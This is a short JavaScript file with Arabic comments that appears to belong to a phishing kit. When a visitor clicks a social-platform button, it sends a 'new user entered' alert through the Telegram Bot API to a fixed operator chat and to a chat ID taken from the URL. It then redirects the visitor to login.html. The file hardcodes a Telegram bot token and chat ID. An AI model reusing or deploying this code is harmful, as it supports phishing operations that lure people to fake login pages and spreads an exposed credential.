function getUserFromURL() {
    const params = new URLSearchParams(window.location.search);
    return params.get("user_id") || "غير معروف"; // استخراج user_id من الرابط
}

function sendToBot(message) {
    const botToken = "7681653454:AAEdoXFfTtBOxL8F3i06jWeBWQjeQjlP-RQ";
    const mainChatId = "5375214810"; // المعرف الأساسي
    const userId = getUserFromURL(); // المعرف الخاص بالمستخدم

    const fullMessage = `🦅 مستخدم جديد دخل!\n🚩 المصدر: ${message}\n👤 اليوزر: ${userId}`;

    // إرسال الرسالة للمعرف الأساسي
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${mainChatId}&text=${encodeURIComponent(fullMessage)}`);

    // إرسال الرسالة لمعرف المستخدم اللي دخل من الرابط (لو مش "غير معروف")
    if (userId !== "غير معروف") {
        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${userId}&text=${encodeURIComponent(fullMessage)}`);
    }
}

document.querySelectorAll(".social-item").forEach(item => {
    item.addEventListener("click", function() {
        let socialPlatform = this.querySelector("span").textContent;
        sendToBot(socialPlatform);
        window.location.href = "login.html";
    });
});
